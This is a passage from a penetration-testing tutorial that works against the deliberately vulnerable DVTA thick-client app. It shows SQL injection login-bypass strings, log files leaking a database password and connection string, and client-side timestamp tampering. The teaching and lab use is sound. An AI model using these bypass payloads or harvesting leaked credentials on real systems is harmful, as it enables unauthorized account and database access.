<p class="ai-optimize-139"><span style="color: #000000;">Let’s see how this attack works.</span></p>
<h4 class="ai-optimize-193"><span style="color: #000000;">Executing SQL Injection in DVTA Application</span></h4>
<p class="ai-optimize-140"><span style="color: #000000;">Without wasting the time let’s quickly open up the DVTA application and that log screen has SQL injection Vulnerability.</span></p>
<p class="ai-optimize-141"><span style="color: #000000;">Open up the notepad and let’s try SQL injection. This is traditionally how vulnerable queries are written.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">select * from username='x' or 'x'='x' and password='x' or 'x'='x' ;</pre>
<h5 class="ai-optimize-142"><span style="color: #000000;"><em>“We are going to use x or x = x and this will confuse the database in a way that it thinks that the query is requesting to check for username = x or x = x obviously x = x is always true and this will return true” and this condition also remain same for the password field.</em></span></h5>
<p class="ai-optimize-143"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5wrUZDZ1-Wc/YFi7C4jjmGI/AAAAAAAAu6c/cYP4ThY1WYwV1Adh56V0oWdYCkSFiddSACLcBGAsYHQ/s16000/41.png"/></span></p>
<p class="ai-optimize-144"><span style="color: #000000;">Let’s try to enter this into the user name and password fields and see it works or not.</span></p>
<p class="ai-optimize-145"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-at91xrusxEQ/YFi7I37YwMI/AAAAAAAAu6k/Vlloh9pmBPUoDZ5P4mXTMjeU_xOm8yC1wCLcBGAsYHQ/s16000/42.png"/></span></p>
<p class="ai-optimize-146"><span style="color: #000000;">Hurray!!! As we can see we are logged in as <strong>“sa” </strong>which is a privileged account. Now we are logged In as some account but using SQL injection we can choose which user we want to login as.</span></p>
<p class="ai-optimize-147"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aVsBWbnzRVc/YFi7M9BeTII/AAAAAAAAu6o/aNLP88Dq2aEMysKHazE3y3HCet9d0LhPgCLcBGAsYHQ/s16000/43.png"/></span></p>
<p class="ai-optimize-148"><span style="color: #000000;">So, let’s logout and change this particular string to something like this.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raj' or 'x'='y</pre>
<p class="ai-optimize-149"><span style="color: #000000;">as we assumed that we know the username</span></p>
<p class="ai-optimize-150"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aCXjV8UY54c/YFi7YcAu6KI/AAAAAAAAu60/WzxXxpfyojQ974elzyS0_G3JJW-PQeBXgCLcBGAsYHQ/s16000/44.png"/></span></p>
<p class="ai-optimize-151"><span style="color: #000000;">Let’s copy the previous string and enter it into the field of username and password.</span></p>
<p class="ai-optimize-152"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FND4OjAfsts/YFi7dVSE4tI/AAAAAAAAu68/3fNxLZqqyggY8K1CZpzHS1hGaElBX-Y8ACLcBGAsYHQ/s16000/45.png"/></span></p>
<p class="ai-optimize-153"><span style="color: #000000;">As we can see now, we are logged In as raj</span></p>
<p class="ai-optimize-154"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Mb8_aruM3sg/YFi7zQMMclI/AAAAAAAAu7M/9NcC9MtwK6MJ1Aw9vNoyPpXRBw8u3PAMACLcBGAsYHQ/s16000/46.png"/></span></p>
<p class="ai-optimize-155"><span style="color: #000000;">Let’s say you want to login as an admin all you need to change the name raj to admin and then enter that string in the field of username and password so that similarly you can log in as admin.</span></p>
<p class="ai-optimize-156"><span style="color: #000000;">This is how we can make use of SQL injection in any application.</span></p>
<h4 class="ai-optimize-194"><span style="color: #000000;">Why Reporting SQL Injection Still Matters</span></h4>
<p class="ai-optimize-157"><span style="color: #000000;"><em>Now you might be wondering we already have full access to the database why do we have to rely on SQL injection to log in as someone. The answer is there may be cases where the password is encrypted in the database and you want to log in as a specific user. That’s the first case, another case is a pentester you always want to tell the developers what the problems are because even though it’s a 2-tier application. Today they may migrate the 3-tier architecture application and if they leave this vulnerable code even in 3-tier architecture that will be a serious problem. So it’s always good to report this kind of problem to do all of us.</em></span></p>
<h3 class="ai-optimize-158"><span style="color: #800000;">Side Channel Data Leaks</span></h3>
<p class="ai-optimize-159"><span style="color: #000000;">This is another interesting security issue that we may come across during Thick Client application penetration testing is Side Channel Data Leaks.</span></p>
<p class="ai-optimize-160"><span style="color: #000000;"><strong><em>I know which question is moving around in your head that what is Side Channel Data Leak?</em></strong></span></p>
<p class="ai-optimize-161"><span style="color: #000000;"><em>Application logging is one of the best examples of Side Channel Data Leaks. Developers often use logging for debugging purposes during development. </em></span></p>
<p class="ai-optimize-162"><span style="color: #000000;"><em>Developers may write and debug logs into the console or some sort of file on the disk. When the application is moved into production if these debug logs are not removed from the application it can cause a security risk.</em></span></p>
<h4 class="ai-optimize-191"><span style="color: #000000;">Demonstrating Logging Vulnerabilities in DVTA</span></h4>
<p class="ai-optimize-163"><span style="color: #000000;">Let’s check out the DVTA application to see if it is writing anything sensitive into console logs.</span></p>
<p class="ai-optimize-164"><span style="color: #000000;">To do this firstly open up the CMD (command prompt) and navigate to the directory of modified DVTA application and let’s run this application by typing</span></p>
<p class="ai-optimize-165"><span style="color: #000000;">“DVTA.exe&gt; and the destination of the directory to save the log file\log.txt”</span></p>
<p class="ai-optimize-166"><span style="color: #000000;">This is the output of this particular console application. This command will open the DVTA application and then log in to the application as shown below.</span></p>
<p class="ai-optimize-167"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-254HpP1wFsk/YFi75isqvxI/AAAAAAAAu7Q/FFh9AtfKfTIsJWcTfLmVST09TvulLcLBQCLcBGAsYHQ/s16000/47.png"/></span></p>
<p class="ai-optimize-168"><span style="color: #000000;">After login to the application click on the view expanses and then click on the view profile and then logout.</span></p>
<p class="ai-optimize-169"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HjVJfJne31o/YFi79Xm2E5I/AAAAAAAAu7U/DWwkSm9FGrs8KUKJvuHq3RQpwQhR3vWsgCLcBGAsYHQ/s16000/48.png"/></span></p>
<p class="ai-optimize-170"><span style="color: #000000;">Further, then login to different accounts such as raj and then explore the application and the logout.</span></p>
<p class="ai-optimize-171"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oqncxtk3BWU/YFi8B6WNRxI/AAAAAAAAu7Y/1L_0HIXkkCESrSazxqghigU0_h_oKbZNgCLcBGAsYHQ/s16000/49.png"/></span></p>
<p class="ai-optimize-172"><span style="color: #000000;">Similarly, login as an admin user and click on Backup data to FTP Server.</span></p>
<p class="ai-optimize-173"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ISH6EkpvL1c/YFi8HI5UTfI/AAAAAAAAu7c/6CTaUasPj7M3J37nQnvz-XJGwyiW1Qj-wCLcBGAsYHQ/s16000/50.png"/></span></p>
<p class="ai-optimize-174"><span style="color: #000000;">Basically, we are just browsing through the application to create some logs. As you can see this will create a log file on the desktop</span></p>
<p class="ai-optimize-175"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WChYTP86-6o/YFi8LSj5gAI/AAAAAAAAu7k/QlW3jJ-IugUSfP0U_sA1jpEwMyrU-asBwCLcBGAsYHQ/s16000/51.png"/></span></p>
<p class="ai-optimize-176"><span style="color: #000000;">Open up that file using notepad and there you can lot of interesting stuff such as Decrypted Database password, Database Connection String and SQL queries …etc</span></p>
<p class="ai-optimize-177"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ebGRphB37-U/YFi8P9qYA2I/AAAAAAAAu7s/szFRVWus9yUh17AougedWv-xPttqNGceQCLcBGAsYHQ/s16000/52.png"/></span></p>
<h4 class="ai-optimize-192"><span style="color: #000000;">Risks of Excessive Logging in Production</span></h4>
<p class="ai-optimize-178"><span style="color: #000000;">Lots of interesting stuff is right there and obviously just using these logs we will be able to compromise the entire database because we have the database connection string and we can log in to the database using these logs. </span></p>
<p class="ai-optimize-179"><span style="color: #000000;">This is why excessive logging in a production application is dangerous.</span></p>
<h3 class="ai-optimize-180"><span style="color: #800000;">Forensic Investigation: – Unreliable logs</span></h3>
<p class="ai-optimize-181"><span style="color: #000000;">This is the common issue that we come across when testing the thick client application, which tampers with client site data that can be used for forensic investigation.</span></p>
<p class="ai-optimize-182"><span style="color: #000000;">For example, your application takes some time stamps from the client machine and saves them in the database for investigation purposes in the future. If there are any incidents and if they want to check the timestamps of the client’s actions. They can use this data collected from the client.</span></p>
<p class="ai-optimize-183"><span style="color: #000000;">However, if the client tempers this client-side data and if the server does not validate it further. It can create unreliable logs on the server-side.</span></p>
<p class="ai-optimize-184"><span style="color: #000000;">Let’s see how it can be tested in the DVTA application. To do this open up the DVTA application and log in as Vijay and then Add some expenses as shown below.</span></p>
<p class="ai-optimize-185"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CDtYHttlDPM/YFi8UlZUJCI/AAAAAAAAu7w/3F-NEaOjycAzG06PASBnYx6AJ07nHjBXgCLcBGAsYHQ/s16000/53.png"/></span></p>
<p class="ai-optimize-186"><span style="color: #000000;">Also, we can view expenses so they will retrieve the data from the database. And if you notice the time is automatically taken from the system. What if the user change this time from 1:31 am to 2:30</span><span style="color: #000000;">pm. Obviously this will result in incorrect unreliable logs on the server-side.</span></p>
<p class="ai-optimize-188"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wf1O315u7ks/YFi8aqmxa-I/AAAAAAAAu70/ImR8yx1hHtoCJMsq6gQSr7GDHKvD98DaQCLcBGAsYHQ/s16000/54.png"/></span></p>
<p class="ai-optimize-189"><span style="color: #000000;">We may want to report this issue if any client-side artifacts are collecting for forensic purposes. </span><span style="color: #000000;">So, this is how we can pentest Thick Client Applications. In the next article, we will talk about Reversing and patching the application.</span></p>
<p class="ai-optimize-190"><span style="color: #000000;"><strong>Author – </strong>Vijay is a Certified Ethical Hacker, Technical writer and Penetration Tester at Hacking Articles. Technology and Gadget freak. Contact <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/vijay-igcbr/">Here</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
